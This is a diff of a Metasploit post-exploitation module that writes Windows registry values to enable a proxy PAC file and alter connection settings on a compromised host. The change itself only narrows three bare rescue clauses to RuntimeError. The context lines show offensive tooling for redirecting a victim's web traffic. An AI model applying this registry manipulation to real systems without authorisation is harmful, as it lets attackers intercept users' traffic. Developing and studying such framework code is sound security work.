@@ -86,7 +86,7 @@ class Metasploit3 < Msf::Post
       file = (@remote) ? "#{pac}" : "file://#{pac}"
       begin
         registry_setvaldata(key,value_auto,file,"REG_SZ")
-      rescue
+      rescue RuntimeError
         next
       end
       print_good ("Proxy PAC enabled.") if change_connection(16,'05',key + '\\Connections')
@@ -112,7 +112,7 @@ class Metasploit3 < Msf::Post
       begin
         registry_setvaldata(key,value_enable,0,"REG_DWORD")
         profile = true
-      rescue
+      rescue RuntimeError
         next
       end
     end
@@ -126,7 +126,7 @@ class Metasploit3 < Msf::Post
       binary_data = value_con.unpack('H*')[0]
       binary_data[offset,2] = value
       registry_setvaldata(key,value_default,["%x" % binary_data.to_i(16)].pack("H*"),"REG_BINARY")
-    rescue
+    rescue RuntimeError
       return false
     end
   end
